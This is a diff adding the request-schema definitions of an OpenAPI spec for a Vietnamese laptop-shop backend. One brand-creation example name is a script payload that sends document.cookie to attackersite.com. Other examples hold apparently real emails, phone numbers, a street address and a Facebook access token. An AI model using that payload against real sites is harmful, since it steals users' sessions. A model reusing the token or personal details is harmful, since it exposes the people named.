+          $ref: '#/definitions/Property1'
+    required:
+    - description
+    - imageUrl
+    - property
+  Property1:
+    title: Property1
+    example:
+      productDetailId: 1
+      value: 8GB DDR4 SO-DIMM
+    type: object
+    properties:
+      productDetailId:
+        type: integer
+        format: int32
+      value:
+        type: string
+    required:
+    - productDetailId
+    - value
+  createrequest1:
+    title: createrequest1
+    example:
+      name: đá
+      parentId: null
+    type: object
+    properties:
+      name:
+        type: string
+      parentId:
+        type: string
+    required:
+    - name
+    - parentId
+  updaterequest1:
+    title: updaterequest1
+    example:
+      name: test lần 2
+      parentId: null
+    type: object
+    properties:
+      name:
+        type: string
+      parentId:
+        type: string
+    required:
+    - name
+    - parentId
+  createrequest2:
+    title: createrequest2
+    example:
+      name: <script> window.location='http://attackersite.com/?cookie=' + document.cookie </script>
+      imageUrl: https://res.cloudinary.com/utc-ss/image/upload/v1676554974/computer/1676554974497-kisspng-gigabyte.jpg
+    type: object
+    properties:
+      name:
+        type: string
+      imageUrl:
+        type: string
+    required:
+    - name
+    - imageUrl
+  updaterequest2:
+    title: updaterequest2
+    example:
+      name: GIGABYTE
+    type: object
+    properties:
+      name:
+        type: string
+    required:
+    - name
+  createrequest3:
+    title: createrequest3
+    example:
+      imageUrl: x.jpg
+      categoryId: 1
+    type: object
+    properties:
+      imageUrl:
+        type: string
+      categoryId:
+        type: integer
+        format: int32
+    required:
+    - imageUrl
+    - categoryId
+  updaterequest3:
+    title: updaterequest3
+    example:
+      imageUrl: aaaa.jpg
+    type: object
+    properties:
+      imageUrl:
+        type: string
+    required:
+    - imageUrl
+  createrequest4:
+    title: createrequest4
+    example:
+      categoryId: 1
+      propertyId: 33
+    type: object
+    properties:
+      categoryId:
+        type: integer
+        format: int32
+      propertyId:
+        type: integer
+        format: int32
+    required:
+    - categoryId
+    - propertyId
+  updaterequest4:
+    title: updaterequest4
+    example:
+      categoryId: 5
+    type: object
+    properties:
+      categoryId:
+        type: integer
+        format: int32
+    required:
+    - categoryId
+  createrequest5:
+    title: createrequest5
+    example:
+      name: vga
+    type: object
+    properties:
+      name:
+        type: string
+    required:
+    - name
+  registerrequest:
+    title: registerrequest
+    example:
+      email: user1x@gmail.com
+      password: '123456789'
+      phone: '0387295907'
+      fullName: user one
+      gender: 1
+    type: object
+    properties:
+      email:
+        type: string
+      password:
+        type: string
+      phone:
+        type: string
+      fullName:
+        type: string
+      gender:
+        type: integer
+        format: int32
+    required:
+    - email
+    - password
+    - phone
+    - fullName
+    - gender
+  loginrequest:
+    title: loginrequest
+    example:
+      email: manhhn.nv@gmail.com
+      password: '123456789'
+    type: object
+    properties:
+      email:
+        type: string
+      password:
+        type: string
+    required:
+    - email
+    - password
+  refreshtokenrequest:
+    title: refreshtokenrequest
+    example:
+      email: manhhn.nv@gmail.com
+      password: '123456789'
+    type: object
+    properties:
+      email:
+        type: string
+      password:
+        type: string
+    required:
+    - email
+    - password
+  updatemerequest:
+    title: updatemerequest
+    example:
+      phone: '0387295590'
+      fullName: YASUO
+      gender: 1
+    type: object
+    properties:
+      phone:
+        type: string
+      fullName:
+        type: string
+      gender:
+        type: integer
+        format: int32
+    required:
+    - phone
+    - fullName
+    - gender
+  changepasswordrequest:
+    title: changepasswordrequest
+    example:
+      oldPassword: 123456az
+      newPassword: '123456789'
+    type: object
+    properties:
+      oldPassword:
+        type: string
+      newPassword:
+        type: string
+    required:
+    - oldPassword
+    - newPassword
+  loginwithggapirequest:
+    title: loginwithggapirequest
+    example:
+      user:
+        email: hieunvmob@gmail.com
+        familyName: nguyễn
+        givenName: hiếu
+        id: '100399402749385764793'
+        name: hiếu nguyễn
+    type: object
+    properties:
+      user:
+        $ref: '#/definitions/User'
+    required:
+    - user
+  User:
+    title: User
+    example:
+      email: hieunvmob@gmail.com
+      familyName: nguyễn
+      givenName: hiếu
+      id: '100399402749385764793'
+      name: hiếu nguyễn
+    type: object
+    properties:
+      email:
+        type: string
+      familyName:
+        type: string
+      givenName:
+        type: string
+      id:
+        type: string
+      name:
+        type: string
+    required:
+    - email
+    - familyName
+    - givenName
+    - id
+    - name
+  loginwithfbapirequest:
+    title: loginwithfbapirequest
+    example:
+      accessToken: EAAKHhZAIzf50BAP585LNViz6WvZBB3SUPTZAsREEj7aSkk77W2qbT8N1C6W8dwZA2bUbcvfRr7MftcKQLFUrC7UeZAMxheKZCVb6VmkxUhZBLnhfogZCCg76RWrPSjuM0Pd9CHSKZATF7L6WZAgCoM2DcYFnyxXIV0dLz2FwWSx5HLyIxr9GESLZCsl9IoQHjDeq7cNTRnetZCwacGnzFZCdrBZBnaPlZAVwA1sGEAufJ1LjSPkW7zZAVIT02qoB
+    type: object
+    properties:
+      accessToken:
+        type: string
+    required:
+    - accessToken
+  forgotpasswordrequest:
+    title: forgotpasswordrequest
+    example:
+      email: manhhn.nv@gmail.com
+    type: object
+    properties:
+      email:
+        type: string
+    required:
+    - email
+  resetpasswordrequest:
+    title: resetpasswordrequest
+    example:
+      password: 123456789az
+    type: object
+    properties:
+      password:
+        type: string
+    required:
+    - password
+  createmyaddressrequest:
+    title: createmyaddressrequest
+    example:
+      name: Bùi Thế Mạnh
+      phone: '0738952136'
+      typeAddress: 0
+      street: Số 1 Tổ 2 Văn Nội
+      detailAddress:
+        city:
+          id: 63
+          name: Hà Nội
+        district:
+          id: 714
+          name: Quận Hà Đông
+        ward:
+          id: 22340
+          name: Phường Phú Lương
+    type: object
+    properties:
+      name:
+        type: string
+      phone:
+        type: string
+      typeAddress:
+        type: integer
+        format: int32
+      street:
+        type: string
+      detailAddress:
+        $ref: '#/definitions/DetailAddress'
+    required:
+    - name
+    - phone
+    - typeAddress
+    - street
+    - detailAddress
+  DetailAddress:
+    title: DetailAddress
+    example:
+      city:
+        id: 63
+        name: Hà Nội
+      district:
+        id: 714
+        name: Quận Hà Đông
+      ward:
+        id: 22340
+        name: Phường Phú Lương
+    type: object
+    properties:
+      city:
+        $ref: '#/definitions/City'
+      district:
+        $ref: '#/definitions/District'
+      ward:
+        $ref: '#/definitions/Ward'
+    required:
+    - city
+    - district
+    - ward
+  City:
+    title: City
+    example:
+      id: 63
+      name: Hà Nội
+    type: object
+    properties:
+      id:
+        type: integer
+        format: int32
+      name:
+        type: string
+    required:
+    - id
+    - name
+  District:
+    title: District
+    example:
+      id: 714
+      name: Quận Hà Đông
+    type: object
+    properties:
+      id:
+        type: integer
+        format: int32
+      name:
+        type: string
+    required:
+    - id
+    - name
+  Ward:
+    title: Ward
+    example:
+      id: 22340
+      name: Phường Phú Lương
+    type: object
+    properties:
+      id:
+        type: integer
+        format: int32
+      name:
+        type: string
+    required:
+    - id
+    - name
+  updaterequest5:
+    title: updaterequest5
+    example:
+      name: chú Hoạch
+      typeAddress: 1
+      street: 172A Yên Lãng
+      detailAddress:
+        city:
+          id: 63
+          name: Hà Nội
+        district:
+          id: 721
+          name: Quận Đống Đa
+        ward:
+          id: 19917
+          name: Phường Láng Hạ
+    type: object
+    properties:
+      name:
+        type: string
+      typeAddress:
+        type: integer
+        format: int32
+      street:
+        type: string
+      detailAddress:
+        $ref: '#/definitions/DetailAddress'
+    required:
+    - name
+    - typeAddress
+    - street
+    - detailAddress
+  addproductrequest:
+    title: addproductrequest
+    example:
+      productId: 3
+      quantity: 1
+    type: object
+    properties:
+      productId:
+        type: integer
+        format: int32
+      quantity:
+        type: integer
+        format: int32
+    required:
+    - productId
+    - quantity
+  updatequantityproductrequest:
+    title: updatequantityproductrequest
+    example:
+      quantity: 2
+    type: object
+    properties:
+      quantity:
+        type: integer
+        format: int32
+    required:
+    - quantity
+  checkoutrequest:
+    title: checkoutrequest
+    example:
+      name: yasuo
+      phone: '0387293562'
+      address: Số 1 Tổ 2 Văn Nội, Phường Phú Lương, Quận Hà Đông, Hà Nội
+      paymentMethod: 1
+      status: 1
+      products:
+      - productId: 4
+        quantity: 1
+        orderDetailId: 132
+      - productId: 3
+        quantity: 1
+        orderDetailId: 133
+      price: 35000000
+      discount: 0
+    type: object
+    properties:
+      name:
+        type: string
+      phone:
+        type: string
+      address:
+        type: string
+      paymentMethod:
+        type: integer
+        format: int32
+      status:
+        type: integer
+        format: int32
+      products:
+        type: array
+        items:
+          $ref: '#/definitions/Product'
+      price:
+        type: integer
+        format: int32
+      discount:
+        type: integer
+        format: int32
+    required:
+    - name
+    - phone
+    - address
+    - paymentMethod
+    - status
+    - products
+    - price
+    - discount
+  Product:
+    title: Product
+    example:
+      productId: 4
+      quantity: 1
+      orderDetailId: 132
+    type: object
+    properties:
+      productId:
+        type: integer
+        format: int32
+      quantity:
+        type: integer
+        format: int32
+      orderDetailId:
+        type: integer
+        format: int32
+    required:
+    - productId
+    - quantity
+    - orderDetailId
+  createrequest6:
+    title: createrequest6
+    example:
+      name: Show room Lê Thanh Nghị
+      phone: '01265789'
+      address: Số 1 Quang Trung, Hà Đông, Hà Nội
+      urlMap: https://www.google.com/maps/place/70+%C4%90.+Nguy%E1%BB%85n+V%C4%83n+Huy%C3%AAn,+Ngh%C4%A9a+%C4%90%C3%B4,+C%E1%BA%A7u+Gi%E1%BA%A5y,+H%C3%A0+N%E1%BB%99i,+Vi%E1%BB%87t+Nam/@21.0502277,105.7955728,17z/data=!3m1!4b1!4m5!3m4!1s0x3135ab24c2306ad1:0x6521ab0ef58a96e6!8m2!3d21.0502277!4d105.7977615
+      email: kinhdoanh.nguyenvanhuyen@gmail.com
+      openTime: Từ 8h-20h hàng ngày
+    type: object
+    properties:
+      name:
+        type: string
+      phone:
+        type: string
+      address:
+        type: string
+      urlMap:
+        type: string
+      email:
+        type: string
+      openTime:
+        type: string
+    required:
+    - name
+    - phone
+    - address
+    - urlMap
+    - email
+    - openTime
+  updaterequest6:
+    title: updaterequest6
+    example:
+      name: Show room Yên Lãng
+      phone: '01265789'
+      address: Số 172A Yên Lãng, Đống Đa, Hà Nội
+    type: object
+    properties:
+      name:
+        type: string
+      phone:
+        type: string
+      address:
+        type: string
+    required:
+    - name
+    - phone
+    - address
+  updatequantityproductinshowroomrequest:
+    title: updatequantityproductinshowroomrequest
+    example:
+      quantity: 50
+    type: object
+    properties:
+      quantity:
+        type: integer
+        format: int32
+    required:
+    - quantity
+  addproductinshowroomrequest:
+    title: addproductinshowroomrequest
+    example:
+      productId: 11
+      quantity: 50
+      showRoomId: 6
+    type: object
+    properties:
+      productId:
+        type: integer
+        format: int32
+      quantity:
+        type: integer
+        format: int32
+      showRoomId:
+        type: integer
+        format: int32
+    required:
+    - productId
+    - quantity
+    - showRoomId
+  updatestatus!=3request:
+    title: updatestatus!=3request
+    example:
+      status: 2
+    type: object
+    properties:
+      status:
+        type: integer
+        format: int32
+    required:
+    - status
+  updatestatus=3request1:
+    title: updatestatus=3request1
+    example:
+      status: 3
+      orderDetails:
+      - id: 134
+        productId: 4
+        quantity: 1
+        showRoomId: 1
+      - id: 135
+        productId: 3
+        quantity: 1
+        showRoomId: 1
+    type: object
+    properties:
+      status:
+        type: integer
+        format: int32
+      orderDetails:
+        type: array
+        items:
+          $ref: '#/definitions/OrderDetail'
+    required:
+    - status
+    - orderDetails
+  OrderDetail:
+    title: OrderDetail
+    example:
+      id: 134
+      productId: 4
+      quantity: 1
+      showRoomId: 1
+    type: object
+    properties:
+      id:
+        type: integer
+        format: int32
+      productId:
+        type: integer
+        format: int32
+      quantity:
+        type: integer
+        format: int32
+      showRoomId:
+        type: integer
+        format: int32
+    required:
+    - id
+    - productId
+    - quantity
+    - showRoomId
+  createsessionrequest:
+    title: createsessionrequest
+    example:
+      products:
+      - productId: 1
+        quantity: 1
+        name: Laptop Asus Gaming TUF FX506LHB-HN188W
+        price: 16999000
+      - productId: 3
+        quantity: 1
+        name: Laptop HP ProBook 440 G9 (6M0X3PA) (i5 1235U/8GB RAM/512GB SSD/14 FHD/Win11/Bạc)
+        price: 17000000
+    type: object
+    properties:
+      products:
+        type: array
+        items:
+          $ref: '#/definitions/Product1'
+    required:
+    - products
+  Product1:
+    title: Product1
+    example:
+      productId: 1
+      quantity: 1
+      name: Laptop Asus Gaming TUF FX506LHB-HN188W
+      price: 16999000
+    type: object
+    properties:
+      productId:
+        type: integer
+        format: int32
+      quantity:
+        type: integer
+        format: int32
+      name:
+        type: string
+      price:
+        type: integer
+        format: int32
+    required:
+    - productId
+    - quantity
+    - name
+    - price
+  createsessionv2request:
+    title: createsessionv2request
+    example:
+      products:
+      - productId: 1
+        quantity: 1
+        name: Laptop Asus Gaming TUF FX506LHB-HN188W
+        price: 16999000
+      - productId: 3
+        quantity: 1
+        name: Laptop HP ProBook 440 G9 (6M0X3PA) (i5 1235U/8GB RAM/512GB SSD/14 FHD/Win11/Bạc)
+        price: 17000000
+    type: object
+    properties:
+      products:
+        type: array
+        items:
+          $ref: '#/definitions/Product1'
+    required:
+    - products
+  createrequest7:
+    title: createrequest7
+    example:
+      productId: 10
+      content: OK
+      rate: 5
+    type: object
+    properties:
+      productId:
+        type: integer
+        format: int32
+      content:
+        type: string
+      rate:
+        type: integer
+        format: int32
+    required:
+    - productId
+    - content
+    - rate
+  updaterequest7:
+    title: updaterequest7
+    example:
+      response: Cảm ơn
+    type: object
+    properties:
+      response:
+        type: string
+    required:
+    - response
+  createrequest8:
+    title: createrequest8
+    example:
+      productId: 3
+      status: 0
+    type: object
+    properties:
+      productId:
+        type: integer
+        format: int32
+      status:
+        type: integer
+        format: int32
+    required:
+    - productId
+    - status
+  updaterequest8:
+    title: updaterequest8
+    example:
+      productId: 3
+      status: 0
+    type: object
+    properties:
+      productId:
+        type: integer
+        format: int32
+      status:
+        type: integer
+        format: int32
+    required:
+    - productId
+    - status
+security: []
+tags:
+- name: product
+- name: category
+- name: brand
+- name: banner
+- name: property value
+- name: property
+- name: user
+- name: upload
+- name: address
+- name: cart
+- name: show room
+- name: order&order-detail
+- name: payment
+- name: assess
+- name: mark
